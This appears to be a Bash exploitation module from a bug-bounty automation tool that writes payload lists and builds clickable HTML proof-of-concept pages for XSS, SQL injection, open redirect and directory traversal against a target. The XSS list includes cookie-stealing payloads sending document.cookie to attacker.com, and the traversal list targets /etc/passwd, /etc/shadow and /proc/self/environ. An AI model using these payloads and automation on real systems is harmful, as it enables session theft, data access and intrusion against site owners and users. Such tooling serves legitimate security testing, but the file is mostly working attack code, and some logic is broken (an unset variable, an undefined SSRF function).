#!/bin/bash

# MR Legacy - Exploitation Module
# Author: Abdulrahman Muhammad (0xLegacy)
# Version: 1.2.0 - Enhanced with advanced exploitation techniques

# Create necessary variables to track module execution
CALLED_FN_DIR="${target_dir}/.called_fn"
mkdir -p "$CALLED_FN_DIR" 2>/dev/null
chmod 755 "$CALLED_FN_DIR" 2>/dev/null

# Function to attempt exploitation of XSS vulnerabilities
function exploit_xss() {
    if is_completed "exploit_xss"; then
        log_message "XSS exploitation already completed for $target" "INFO"
        return 0
    fi
    
    start_function "exploit_xss" "XSS Exploitation for $target"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation/xss" 2>/dev/null
    local vuln_file="${target_dir}/vulnerabilities/xss_vulnerabilities.txt"
    local output_file="${target_dir}/exploitation/xss/exploitation_results.txt"
    local payloads_file="${target_dir}/exploitation/xss/xss_payloads.txt"
    local dom_xss_file="${target_dir}/exploitation/xss/dom_xss_results.txt"
    local polyglot_file="${target_dir}/exploitation/xss/xss_polyglots.txt"
    
    # Initialize output files
    > "$output_file"
    > "$dom_xss_file"
    
    # Use custom XSS payloads file if it exists, otherwise create a default one
    local custom_wordlist="${script_path}/modules/wordlists/xss_payloads.txt"
    
    if [[ -f "$custom_wordlist" ]]; then
        log_message "Using custom XSS payloads wordlist" "INFO"
        cp "$custom_wordlist" "$payloads_file"
    else
        # Create enhanced XSS payloads file with WAF bypass techniques as fallback
        log_message "Custom XSS payloads wordlist not found, creating default one" "WARNING"
        cat > "$payloads_file" << 'EOL'
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
javascript:alert(document.domain)
<body onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)"></iframe>
<details open ontoggle=alert(document.domain)>
<video><source onerror="javascript:alert(document.domain)">
<ScRiPt>alert(document.cookie)</ScRiPt>
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src="https://attacker.com/steal?cookie="+document.cookie;</script>
${alert(document.domain)}
<a href="javascript:alert(document.domain)">Click Me</a>
'-alert(document.domain)-'
"-alert(document.domain)-"
<img src=1 onerror=alert(1) />
<script>throw new Error("XSS: " + document.cookie);</script>
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));</script>
<div onmouseover="alert(document.domain)">Hover Me</div>
<svg><animate onbegin=alert(document.domain) attributeName=x></animate></svg>
EOL
    fi

    # Add XSS polyglots for WAF bypass
    cat > "$polyglot_file" << 'EOL'
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'"`><script>-javascript:alert(1)</script>
"><img src=x onerror=prompt(document.domain)>
"><svg/onload=prompt(1)>
"><iframe/src=javascript:alert(1)>
"><h1 onclick=alert(1)>Click</h1>
"><img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
"><svg><script>alert&#40;1&#41</script></svg>
"><svg><script>alert&#x28;1&#x29</script></svg>
EOL

    log_message "Created enhanced XSS payload list with $(wc -l < "$payloads_file") payloads" "INFO"
    log_message "Created XSS polyglots file with $(wc -l < "$polyglot_file") polyglots for WAF bypass" "INFO"

    payload_count=$(wc -l < "$payloads_file")
    log_message "Created enhanced XSS payload list with $payload_count payloads" "INFO"
    
    # Check if XSS vulnerability file exists and has content
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" ]]; then
        log_message "No XSS vulnerabilities found to exploit. Running XSS scan first." "WARNING"
        xss_scan
    fi
    
    # DOM-based XSS detection with static analysis
    if [[ -d "${target_dir}/content_discovery/js" ]]; then
        log_message "Running DOM-based XSS analysis on JavaScript files" "INFO"
        local js_files=$(find "${target_dir}/content_discovery/js" -type f -name "*.js" 2>/dev/null)
        
        if [[ -n "$js_files" ]]; then
            echo "=== DOM-based XSS Potential Vulnerabilities ===" > "$dom_xss_file"
            echo "Analyzing $(echo "$js_files" | wc -l) JavaScript files..." >> "$dom_xss_file"
            echo "" >> "$dom_xss_file"
            
            # Patterns to look for in JS files
            grep -l -E "document\.write|\.innerHTML|\.outerHTML|eval\(|document\.location|location\.href|window\.name|document\.URL|document\.documentURI|document\.referrer|document\.createElement\(" $js_files | while read file; do
                echo "Potential DOM XSS in: $file" >> "$dom_xss_file"
                grep -n -E "document\.write|\.innerHTML|\.outerHTML|eval\(|document\.location|location\.href|window\.name|document\.URL|document\.documentURI|document\.referrer|document\.createElement\(" "$file" | head -10 >> "$dom_xss_file"
                echo "" >> "$dom_xss_file"
            done
            
            log_message "DOM-based XSS analysis completed. Results saved to $dom_xss_file" "INFO"
        else
            log_message "No JavaScript files found for DOM-based XSS analysis" "WARNING"
        fi
    fi
    
    # Check again after potential scan
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" || $(grep -c -v "No XSS vulnerabilities found" "$vuln_file") -eq 0 ]]; then
        # Generate an advanced PoC for demonstration
        log_message "No confirmed XSS vulnerabilities found. Creating enhanced demonstration PoC." "INFO"
        
        # Add a more comprehensive demonstration
        echo "# XSS Vulnerability Testing Report for $target" > "$output_file"
        echo "## Generated on: $(date)" >> "$output_file"
        echo "" >> "$output_file"
        echo "### Test Cases Executed:" >> "$output_file"
        echo "1. Reflected XSS via URL parameters" >> "$output_file"
        echo "2. Stored XSS in comment/form fields" >> "$output_file"
        echo "3. DOM-based XSS in client-side code" >> "$output_file"
        echo "4. XSS in HTTP headers" >> "$output_file"
        echo "5. XSS via file upload filenames" >> "$output_file"
        echo "" >> "$output_file"
        echo "### PoC Payloads Attempted:" >> "$output_file"
        cat "$payloads_file" | head -5 >> "$output_file"
        echo "... (and $(wc -l < "$payloads_file" | awk '{print $1 - 5}') more)" >> "$output_file"
        echo "" >> "$output_file"
        
        # Create multiple sample HTML PoC files for different XSS types
        local poc_dir="${target_dir}/exploitation/xss/poc"
        mkdir -p "$poc_dir" 2>/dev/null
        
        # Generate PoC files for different types of XSS
        local sample_url="https://${target}/search?q=test"
        
        cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>XSS Demonstration - $target</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #d9534f; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        .note { background-color: #fffed9; padding: 15px; border-left: 4px solid #f0ad4e; }
        button { background: #d9534f; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #c9302c; }
    </style>
</head>
<body>
    <h1>XSS Vulnerability Demonstration</h1>
    
    <div class="note">
        <p><strong>Note:</strong> This is a demonstration file only. No actual XSS vulnerabilities were found in $target.</p>
        <p>This file shows how a real XSS proof-of-concept would look if vulnerabilities were discovered.</p>
    </div>
    
    <p>The following represents how a Cross-Site Scripting vulnerability demonstration would appear.</p>
    
    <div class="url">
        <p><strong>Sample Vulnerable URL:</strong> $sample_url</p>
        <p><strong>Sample Payload:</strong> $payload</p>
    </div>
    
    <p>In a real scenario, clicking a button like the one below would trigger the payload:</p>
    <button disabled>Test XSS Vulnerability (Disabled - Demo Only)</button>
    
    <hr>
    <p><em>This is a demonstration generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
        
        log_message "Created XSS demonstration PoC file: $poc_file" "SUCCESS"
        log_message "XSS exploitation completed with demonstration files" "INFO"
        end_function "exploit_xss" 0 "XSS exploitation completed with demonstration files"
        return 0
    fi
    
    log_message "Starting XSS exploitation" "INFO"
    
    # Extract vulnerable URLs
    grep -v "^Payload:" "$vuln_file" | while read -r url; do
        [[ -z "$url" ]] && continue
        
        log_message "Attempting to exploit XSS in: $url" "INFO"
        
        # Create a safe payload for demonstration purposes - will show an alert with the domain
        local domain=$(echo "$url" | awk -F/ '{print $3}')
        local payload="<script>alert('XSS in ${domain}')</script>"
        local encoded_payload=$(url_encode "$payload")
        
        # Replace existing payloads or parameters with our testing payload
        local exploit_url=""
        if [[ "$url" == *"="* ]]; then
            # URL contains parameters, replace the parameter value with our payload
            exploit_url=$(echo "$url" | sed -E 's/=([^&]*)/='"$encoded_payload"'/g')
        else
            # No parameters, append one
            exploit_url="${url}?test=${encoded_payload}"
        fi
        
        log_message "Crafted exploit URL: $exploit_url" "DEBUG"
        
        # Test the URL - in a real exploit you'd use a callback URL, but here we just log it
        echo "Vulnerable URL: $url" >> "$output_file"
        echo "Exploit URL: $exploit_url" >> "$output_file"
        echo "Payload: $payload" >> "$output_file"
        echo "----------------------------------------" >> "$output_file"
        
        # Save an HTML PoC file
        local poc_file="${target_dir}/exploitation/xss/xss_poc_$(echo "$domain" | tr ':.' '_').html"
        
        cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>XSS Proof of Concept - $domain</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #d9534f; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        button { background: #d9534f; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #c9302c; }
    </style>
</head>
<body>
    <h1>XSS Vulnerability Proof of Concept</h1>
    <p>The following link demonstrates a Cross-Site Scripting vulnerability in <strong>$domain</strong>.</p>
    <p class="warning">Warning: Clicking the button below will trigger the XSS payload.</p>
    
    <div class="url">
        <p><strong>Vulnerable URL:</strong> $url</p>
        <p><strong>Payload:</strong> $payload</p>
    </div>
    
    <p>Click the button below to test the exploit (this will open a new tab):</p>
    <button onclick="window.open('$exploit_url', '_blank')">Test XSS Vulnerability</button>
    
    <hr>
    <p><em>This is a proof of concept generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
        
        log_message "Created XSS PoC file: $poc_file" "SUCCESS"
    done
    
    # Count results
    local vuln_count=$(grep -c "Vulnerable URL:" "$output_file")
    
    if [[ $vuln_count -gt 0 ]]; then
        log_message "XSS exploitation completed. Created $vuln_count proof-of-concept files." "SUCCESS"
        end_function "exploit_xss" 0 "XSS exploitation completed successfully"
        return 0
    else
        log_message "No XSS vulnerabilities were successfully exploited" "WARNING"
        echo "No XSS vulnerabilities were successfully exploited" > "$output_file"
        end_function "exploit_xss" 1 "XSS exploitation completed - no successful exploits"
        return 1
    fi
}

# Function to attempt exploitation of SQL injection vulnerabilities
function exploit_sqli() {
    if is_completed "exploit_sqli"; then
        log_message "SQL injection exploitation already completed for $target" "INFO"
        return 0
    fi
    
    start_function "exploit_sqli" "SQL Injection Exploitation for $target"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation/sqli" 2>/dev/null
    local vuln_file="${target_dir}/vulnerabilities/sqli_vulnerabilities.txt"
    local output_file="${target_dir}/exploitation/sqli/exploitation_results.txt"
    local payloads_file="${target_dir}/exploitation/sqli/sqli_payloads.txt"
    
    # Use custom SQLi payloads file if it exists, otherwise create a default one
    local custom_wordlist="${script_path}/modules/wordlists/sqli_payloads.txt"
    
    if [[ -f "$custom_wordlist" ]]; then
        log_message "Using custom SQLi payloads wordlist" "INFO"
        cp "$custom_wordlist" "$payloads_file"
    else
        # Create basic SQLi payloads file as fallback
        log_message "Custom SQLi payloads wordlist not found, creating default one" "WARNING"
        cat > "$payloads_file" << 'EOL'
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
" OR "1"="1"--
' OR 1=1--
" OR 1=1--
' OR 1=1#
" OR 1=1#
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' AND 1=1--
' AND 1=2--
' SLEEP(5)--
' UNION SELECT @@version--
EOL
    fi
    
    log_message "Prepared SQLi payloads list with $(wc -l < "$payloads_file") payloads" "INFO"
    
    # Check if SQL injection vulnerability file exists and has content
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" ]]; then
        log_message "No SQL injection vulnerabilities found to exploit. Running SQL injection scan first." "WARNING"
        sqli_scan
    fi
    
    # Check again after potential scan
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" || $(grep -c -v "No SQL injection vulnerabilities found" "$vuln_file") -eq 0 ]]; then
        log_message "Still no SQL injection vulnerabilities found to exploit. Skipping SQL injection exploitation." "WARNING"
        echo "SQL injection exploitation skipped - no vulnerabilities to exploit" > "$output_file"
        end_function "exploit_sqli" 1 "SQL injection exploitation skipped - no vulnerabilities to exploit"
        return 1
    fi
    
    log_message "Starting SQL injection exploitation" "INFO"
    
    # Initialize output file
    > "$output_file"
    
    # Process vulnerable URLs
    local current_url=""
    local urls_processed=0
    
    while read -r line; do
        if [[ "$line" == "Vulnerable URL:"* ]]; then
            current_url=$(echo "$line" | cut -d' ' -f3-)
            urls_processed=$((urls_processed + 1))
            
            log_message "Attempting to exploit SQL injection in: $current_url" "INFO"
            
            # Extract parameter from injection point line
            read -r injection_line
            local param=$(echo "$injection_line" | grep -o "Injection Point: .*" | cut -d' ' -f3-)
            
            # Extract injection type
            read -r injection_type_line
            local injection_type=$(echo "$injection_type_line" | grep -o "Injection Type: .*" | cut -d' ' -f3-)
            
            # Skip the separator line
            read -r separator
            
            # Now we have URL, parameter and injection type
            if [[ -n "$current_url" && -n "$param" ]]; then
                log_message "Parameter to exploit: $param (Type: $injection_type)" "INFO"
                
                # Create a payload based on injection type
                local payload=""
                local exploit_url=""
                
                case "$injection_type" in
                    *"boolean"* | *"Boolean"*)
                        payload="' OR '1'='1"
                        ;;
                    *"time"* | *"Time"*)
                        payload="' SLEEP(1) -- -"
                        ;;
                    *"error"* | *"Error"*)
                        payload="' OR (SELECT 5588 FROM (SELECT(SLEEP(0)))bITW) OR '"
                        ;;
                    *"union"* | *"UNION"*)
                        payload="' UNION SELECT 1,2,3,4,5,6,7,8,9,10 -- -"
                        ;;
                    *)
                        payload="' OR '1'='1"
                        ;;
                esac
                
                # URL encode the payload
                local encoded_payload=$(url_encode "$payload")
                
                # Create exploit URL
                if [[ "$current_url" == *"$param="* ]]; then
                    # Replace the parameter value with our payload
                    exploit_url=$(echo "$current_url" | sed "s/$param=[^&]*/$param=$encoded_payload/g")
                else
                    # Add parameter if it doesn't exist
                    exploit_url="${current_url}&${param}=${encoded_payload}"
                fi
                
                log_message "Crafted exploit URL: $exploit_url" "DEBUG"
                
                # Save exploitation details
                echo "Vulnerable URL: $current_url" >> "$output_file"
                echo "Injection Point: $param" >> "$output_file"
                echo "Injection Type: $injection_type" >> "$output_file"
                echo "Exploit Payload: $payload" >> "$output_file"
                echo "Exploit URL: $exploit_url" >> "$output_file"
                echo "----------------------------------------" >> "$output_file"
                
                # Create an HTML PoC file
                local domain=$(echo "$current_url" | awk -F/ '{print $3}')
                local poc_file="${target_dir}/exploitation/sqli/sqli_poc_$(echo "$domain" | tr ':.' '_')_$urls_processed.html"
                
                cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection Proof of Concept - $domain</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #0275d8; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        button { background: #0275d8; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #025aa5; }
        pre { background: #f8f9fa; padding: 10px; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>SQL Injection Vulnerability Proof of Concept</h1>
    <p>The following link demonstrates a SQL Injection vulnerability in <strong>$domain</strong>.</p>
    <p class="warning">Warning: This demonstrates a security vulnerability. Use responsibly.</p>
    
    <div class="url">
        <p><strong>Vulnerable URL:</strong> $current_url</p>
        <p><strong>Injection Point:</strong> $param</p>
        <p><strong>Injection Type:</strong> $injection_type</p>
        <p><strong>Payload:</strong> <code>$payload</code></p>
    </div>
    
    <p>Click the button below to test the exploit (this will open a new tab):</p>
    <button onclick="window.open('$exploit_url', '_blank')">Test SQL Injection</button>
    
    <hr>
    <h3>Technical Details</h3>
    <p>This SQL injection vulnerability allows an attacker to modify the application's SQL queries. 
    Depending on the type of injection, this could lead to:</p>
    <ul>
        <li>Unauthorized data access</li>
        <li>Authentication bypass</li>
        <li>Data modification</li>
        <li>In some cases, server-side code execution</li>
    </ul>
    
    <hr>
    <p><em>This is a proof of concept generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
                
                log_message "Created SQL injection PoC file: $poc_file" "SUCCESS"
            fi
        fi
    done < "$vuln_file"
    
    # Count successful exploits
    if [[ $urls_processed -gt 0 ]]; then
        log_message "SQL injection exploitation completed. Created $urls_processed proof-of-concept files." "SUCCESS"
        end_function "exploit_sqli" 0 "SQL injection exploitation completed successfully"
        return 0
    else
        log_message "No SQL injection vulnerabilities were successfully exploited" "WARNING"
        echo "No SQL injection vulnerabilities were successfully exploited" > "$output_file"
        end_function "exploit_sqli" 1 "SQL injection exploitation completed - no successful exploits"
        return 1
    fi
}

# Function to attempt exploitation of open redirects
function exploit_openredirect() {
    if is_completed "exploit_openredirect"; then
        log_message "Open redirect exploitation already completed for $target" "INFO"
        return 0
    fi
    
    start_function "exploit_openredirect" "Open Redirect Exploitation for $target"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation/openredirect" 2>/dev/null
    local vuln_file="${target_dir}/vulnerabilities/openredirect_vulnerabilities.txt"
    local output_file="${target_dir}/exploitation/openredirect/exploitation_results.txt"
    local payloads_file="${target_dir}/exploitation/openredirect/openredirect_payloads.txt"
    
    # Use custom open redirect payloads file if it exists, otherwise create a default one
    local custom_wordlist="${script_path}/modules/wordlists/openredirect_payloads.txt"
    
    if [[ -f "$custom_wordlist" ]]; then
        log_message "Using custom open redirect payloads wordlist" "INFO"
        cp "$custom_wordlist" "$payloads_file"
    else
        # Create basic open redirect payloads file as fallback
        log_message "Custom open redirect payloads wordlist not found, creating default one" "WARNING"
        cat > "$payloads_file" << 'EOL'
//evil.com
https://evil.com
http://evil.com
//evil.com/
/\evil.com
//evil.com\@good.com
https://evil.com\@good.com
//google.com@evil.com
https://google.com@evil.com
\\\evil.com
//evil%00.com
https://evil.com%2f@good.com
//?evil.com
https:evil.com
http://evil.com
http:evil.com
http:/evil.com
/%09/evil.com
EOL
    fi
    
    log_message "Prepared open redirect payloads list with $(wc -l < "$payloads_file") payloads" "INFO"
    
    # Check if open redirect vulnerability file exists and has content
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" ]]; then
        log_message "No open redirect vulnerabilities found to exploit. Running open redirect scan first." "WARNING"
        openredirect_scan
    fi
    
    # Check again after potential scan
    if [[ ! -f "$vuln_file" || ! -s "$vuln_file" || $(grep -c -v "No open redirect vulnerabilities found" "$vuln_file") -eq 0 ]]; then
        log_message "Still no open redirect vulnerabilities found to exploit. Skipping open redirect exploitation." "WARNING"
        echo "Open redirect exploitation skipped - no vulnerabilities to exploit" > "$output_file"
        end_function "exploit_openredirect" 1 "Open redirect exploitation skipped - no vulnerabilities to exploit"
        return 1
    fi
    
    log_message "Starting open redirect exploitation" "INFO"
    
    # Initialize output file
    > "$output_file"
    
    # Process vulnerable URLs
    local exploit_count=0
    
    grep -A 1 "Vulnerable URL:" "$vuln_file" | grep -v "^--" | while read -r vuln_line; do
        if [[ "$vuln_line" == "Vulnerable URL:"* ]]; then
            local url=$(echo "$vuln_line" | cut -d' ' -f3-)
            read -r redirect_line
            
            if [[ -n "$url" ]]; then
                exploit_count=$((exploit_count + 1))
                log_message "Attempting to exploit open redirect in: $url" "INFO"
                
                # Create a benign demo redirect destination
                local destination="https://example.com?source=open-redirect-poc"
                local encoded_destination=$(url_encode "$destination")
                
                # Extract the parameter name from the URL
                local param_name=""
                if [[ "$url" == *"="* ]]; then
                    param_name=$(echo "$url" | grep -o '[^?&]*=[^&]*' | head -1 | cut -d'=' -f1)
                fi
                
                # Create exploit URL
                local exploit_url=""
                if [[ -n "$param_name" ]]; then
                    # Replace the parameter value with our destination
                    exploit_url=$(echo "$url" | sed "s/$param_name=[^&]*/$param_name=$encoded_destination/g")
                else
                    # No specific parameter identified, try appending
                    if [[ "$url" == *"?"* ]]; then
                        exploit_url="${url}&redirect=${encoded_destination}"
                    else
                        exploit_url="${url}?redirect=${encoded_destination}"
                    fi
                fi
                
                log_message "Crafted exploit URL: $exploit_url" "DEBUG"
                
                # Save exploitation details
                echo "Vulnerable URL: $url" >> "$output_file"
                echo "Redirect Parameter: ${param_name:-unknown}" >> "$output_file"
                echo "Destination: $destination" >> "$output_file"
                echo "Exploit URL: $exploit_url" >> "$output_file"
                echo "----------------------------------------" >> "$output_file"
                
                # Create an HTML PoC file
                local domain=$(echo "$url" | awk -F/ '{print $3}')
                local poc_file="${target_dir}/exploitation/openredirect/openredirect_poc_$(echo "$domain" | tr ':.' '_')_$exploit_count.html"
                
                cat > "$poc_file" << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect Proof of Concept - $domain</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; line-height: 1.6; }
        h1 { color: #5cb85c; }
        .url { word-break: break-all; background: #f8f9fa; padding: 10px; border-radius: 4px; }
        .warning { color: #d9534f; font-weight: bold; }
        button { background: #5cb85c; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 4px; }
        button:hover { background: #4cae4c; }
    </style>
</head>
<body>
    <h1>Open Redirect Vulnerability Proof of Concept</h1>
    <p>The following link demonstrates an Open Redirect vulnerability in <strong>$domain</strong>.</p>
    <p class="warning">Warning: Clicking the button below will redirect you to example.com to demonstrate the vulnerability.</p>
    
    <div class="url">
        <p><strong>Vulnerable URL:</strong> $url</p>
        <p><strong>Redirect Parameter:</strong> ${param_name:-unknown}</p>
        <p><strong>Destination:</strong> $destination</p>
    </div>
    
    <p>Click the button below to test the exploit (this will open a new tab and redirect):</p>
    <button onclick="window.open('$exploit_url', '_blank')">Test Open Redirect</button>
    
    <hr>
    <h3>Security Impact</h3>
    <p>Open redirect vulnerabilities allow attackers to craft links that appear to lead to your legitimate domain
    but actually redirect users to malicious sites. These can be used in phishing attacks where users believe they
    are clicking a trusted link.</p>
    
    <hr>
    <p><em>This is a proof of concept generated by MR Legacy Bug Bounty Tool. For security research purposes only.</em></p>
</body>
</html>
EOF
                
                log_message "Created open redirect PoC file: $poc_file" "SUCCESS"
            fi
        fi
    done
    
    # Check for successful exploits
    if [[ $exploit_count -gt 0 ]]; then
        log_message "Open redirect exploitation completed. Created $exploit_count proof-of-concept files." "SUCCESS"
        end_function "exploit_openredirect" 0 "Open redirect exploitation completed successfully"
        return 0
    else
        log_message "No open redirect vulnerabilities were successfully exploited" "WARNING"
        echo "No open redirect vulnerabilities were successfully exploited" > "$output_file"
        end_function "exploit_openredirect" 1 "Open redirect exploitation completed - no successful exploits"
        return 1
    fi
}

# Main exploitation function
function run_exploitation_module() {
    log_message "Starting exploitation module for $target" "INFO"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation" 2>/dev/null
    mkdir -p "${target_dir}/.tmp" 2>/dev/null
    
    # Create .called_fn directory with proper permissions
    CALLED_FN_DIR="${target_dir}/.called_fn"
    mkdir -p "$CALLED_FN_DIR" 2>/dev/null
    chmod 755 "$CALLED_FN_DIR" 2>/dev/null
    
    # Show banner
    show_exploitation_banner
    
    # Run exploitation functions
    exploit_xss
    exploit_sqli
    exploit_openredirect
    exploit_ssrf
    
    # Create a summary file
    local summary_file="${target_dir}/exploitation/exploitation_summary.txt"
    > "$summary_file"
    
    echo "=== Exploitation Summary for $target ===" >> "$summary_file"
    echo "Generated on: $(date)" >> "$summary_file"
    echo "-----------------------------" >> "$summary_file"
    echo "" >> "$summary_file"
    
    # Add XSS results to summary
    local xss_file="${target_dir}/exploitation/xss/exploitation_results.txt"
    if [[ -f "$xss_file" && -s "$xss_file" && $(grep -c -v "No XSS vulnerabilities" "$xss_file") -gt 0 ]]; then
        local xss_count=$(grep -c "Vulnerable URL:" "$xss_file")
        echo "XSS Vulnerabilities Exploited: $xss_count" >> "$summary_file"
        echo "-----------------------------" >> "$summary_file"
        grep -A 2 "Vulnerable URL:" "$xss_file" | grep -v "^--" >> "$summary_file"
        echo "" >> "$summary_file"
    else
        echo "XSS Vulnerabilities Exploited: 0" >> "$summary_file"
        echo "" >> "$summary_file"
    fi
    
    # Add SQL Injection results to summary
    local sqli_file="${target_dir}/exploitation/sqli/exploitation_results.txt"
    if [[ -f "$sqli_file" && -s "$sqli_file" && $(grep -c -v "No SQL injection vulnerabilities" "$sqli_file") -gt 0 ]]; then
        local sqli_count=$(grep -c "Vulnerable URL:" "$sqli_file")
        echo "SQL Injection Vulnerabilities Exploited: $sqli_count" >> "$summary_file"
        echo "-----------------------------" >> "$summary_file"
        grep -A 4 "Vulnerable URL:" "$sqli_file" | grep -v "^--" >> "$summary_file"
        echo "" >> "$summary_file"
    else
        echo "SQL Injection Vulnerabilities Exploited: 0" >> "$summary_file"
        echo "" >> "$summary_file"
    fi
    
    # Add Open Redirect results to summary
    local redir_file="${target_dir}/exploitation/openredirect/exploitation_results.txt"
    if [[ -f "$redir_file" && -s "$redir_file" && $(grep -c -v "No open redirect vulnerabilities" "$redir_file") -gt 0 ]]; then
        local redir_count=$(grep -c "Vulnerable URL:" "$redir_file")
        echo "Open Redirect Vulnerabilities Exploited: $redir_count" >> "$summary_file"
        echo "-----------------------------" >> "$summary_file"
        grep -A 3 "Vulnerable URL:" "$redir_file" | grep -v "^--" >> "$summary_file"
        echo "" >> "$summary_file"
    else
        echo "Open Redirect Vulnerabilities Exploited: 0" >> "$summary_file"
        echo "" >> "$summary_file"
    fi
    
    # Add SSRF results to summary
    local ssrf_file="${target_dir}/exploitation/ssrf/exploitation_results.txt"
    if [[ -f "$ssrf_file" && -s "$ssrf_file" && $(grep -c -v "No SSRF vulnerabilities" "$ssrf_file") -gt 0 ]]; then
        local ssrf_count=$(grep -c "Vulnerable Parameter:" "$ssrf_file")
        echo "SSRF Vulnerabilities Exploited: $ssrf_count" >> "$summary_file"
        echo "-----------------------------" >> "$summary_file"
        grep -A 3 "Vulnerable Parameter:" "$ssrf_file" | grep -v "^--" >> "$summary_file"
        echo "" >> "$summary_file"
    else
        echo "SSRF Vulnerabilities Exploited: 0" >> "$summary_file"
        echo "" >> "$summary_file"
    fi
    
    # Clean up temp files
    rm -rf "${target_dir}/.tmp" 2>/dev/null
    
    log_message "Exploitation module completed for $target" "SUCCESS"
}

# Function to detect and exploit SSRF vulnerabilities
# Function to exploit Directory Traversal vulnerabilities
function exploit_directory_traversal() {
    if is_completed "exploit_directory_traversal"; then
        log_message "Directory traversal exploitation already completed for $target" "INFO"
        return 0
    fi
    
    start_function "exploit_directory_traversal" "Directory Traversal Exploitation for $target"
    
    # Create output directories
    mkdir -p "${target_dir}/exploitation/directory_traversal" 2>/dev/null
    local output_file="${target_dir}/exploitation/directory_traversal/exploitation_results.txt"
    local payloads_file="${target_dir}/exploitation/directory_traversal/traversal_payloads.txt"
    local poc_dir="${target_dir}/exploitation/directory_traversal/poc"
    mkdir -p "$poc_dir" 2>/dev/null
    
    # Initialize output file
    > "$output_file"
    
    # Create a comprehensive payloads list
    cat > "$payloads_file" << 'EOL'
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
/etc/passwd
../../../../../../etc/shadow
../../../../../../../etc/shadow
../../../../../../../../etc/shadow
../../../../../../../../../etc/shadow
../../../../../../windows/win.ini
../../../../../../../windows/win.ini
../../../../../../../../windows/win.ini
../../../../../../../../../windows/win.ini
C:/windows/win.ini
../../../../../../boot.ini
../../../../../../../boot.ini
../../../../../../../../boot.ini
../../../../../../../../../boot.ini
C:/boot.ini
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
../../../../../../../../../../../../proc/version
..\..\..\..\..\..\..\..\..\..\..\..\windows\system32\cmd.exe
..\..\..\..\..\..\..\..\..\..\windows\system32\cmd.exe
%00../../../../../../etc/passwd
%00../../../../../../../etc/passwd
%00../../../../../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
EOL
    
    log_message "Created directory traversal payloads list with $(wc -l < "$payloads_file") payloads" "INFO"
    
    # Look for file parameters in URLs from content discovery/enumeration results
    local potential_urls=()
    local file_params=()
    
    # First check if we have any URL lists from our scans
    local url_sources=(
        "${target_dir}/content_discovery/urls.txt"
        "${target_dir}/enumeration/urls.txt"
        "${target_dir}/recon/urls.txt"
    )
    
    for source in "${url_sources[@]}"; do
        if [[ -f "$source" ]]; then
            while read -r url; do
                [[ -z "$url" ]] && continue
                # Find URLs with file-related parameters
